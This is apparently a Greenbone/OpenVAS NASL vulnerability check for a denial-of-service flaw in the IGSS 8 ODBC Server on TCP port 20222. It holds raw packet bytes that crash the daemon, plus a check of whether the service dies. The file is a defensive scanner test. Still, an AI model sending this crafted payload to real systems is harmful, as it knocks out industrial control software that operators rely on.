# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900276");
  script_version("2025-03-05T05:38:52+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-04-01 15:39:52 +0200 (Fri, 01 Apr 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("IGSS ODBC Server Multiple Uninitialized Pointer Denial of Service Vulnerability");


  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(20222);
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause a denial of
  service.");
  script_tag(name:"affected", value:"IGSS 8 ODBC Server (Odbcixv8se.exe) Version 10299, Other versions may also
  be affected.");
  script_tag(name:"solution", value:"Upgrade IGSS 8 ODBC Server (Odbcixv8se.exe) version 11003 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"IGSS ODBC Server is prone to a denial of service (DoS) vulnerability.");
  script_tag(name:"insight", value:"The flaw is caused by an uninitialized pointer free conditions, when
  processing specially packets sent to port 20222/TCP, which could be exploited
  by remote unauthenticated attackers to crash an affected daemon.

  Note: IGSS uses a 3rd party ODBC driver kit from Dr. DeeBee");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/66261");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17033/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/99653/");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-11-018-02.pdf");
  script_xref(name:"URL", value:"http://www.igss.com/");
  exit(0);
}

igssODBCPort = 20222;
if(!get_port_state(igssODBCPort)){
  exit(0);
}

soc = open_sock_tcp(igssODBCPort);
if(!soc){
  exit(0);
}

req1 = raw_string( 0x00, 0x00, 0x00, 0x34,
                   0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
                   0x02, 0x2e, 0x00, 0x00, 0x00, 0x00, 0x19, 0x49,
                   0x47, 0x53, 0x53, 0x33, 0x32, 0x76, 0x38, 0x20,
                   0x4f, 0x44, 0x42, 0x43, 0x20, 0x4e, 0x65, 0x74,
                   0x77, 0x6f, 0x72, 0x6b, 0x20, 0x44, 0x53, 0x00,
                   0x00, 0x00, 0x00, 0x02, 0x20, 0x00, 0x00, 0x00,
                   0x00, 0x02, 0x20, 0x00
                );

req2 = raw_string( 0x00, 0x00, 0x00, 0xff,                    ## Length
                   0x16,                                      ## Switch Code
                   crap(data: raw_string(0x77), length:254),  ## Start of Query
                   0x88, 0x99, 0xaa, 0xbb                     ## Test
                 );

send(socket:soc, data:req1);
res = recv(socket:soc, length:1300);

if("IGSS" >< res)
{
  send(socket:soc, data:req2);
  res = recv(socket:soc, length:1024);
}
close(soc);

sleep(5);

soc2 = open_sock_tcp(igssODBCPort);
if(!soc2){
  security_message(igssODBCPort);
  exit(0);
}
close(soc2);
